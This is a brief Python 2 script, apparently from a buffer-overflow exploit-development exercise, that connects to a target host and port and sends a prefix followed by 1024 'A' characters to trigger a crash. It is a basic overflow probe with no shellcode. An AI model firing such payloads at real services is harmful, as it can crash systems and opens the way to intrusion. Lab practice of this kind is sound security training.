 #!/usr/bin/env python2
import socket
from PARAMETERS import RHOST, RPORT, pre_buffer_name
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*1024
buf += "\n"

s.send(pre_buffer_name + buf)
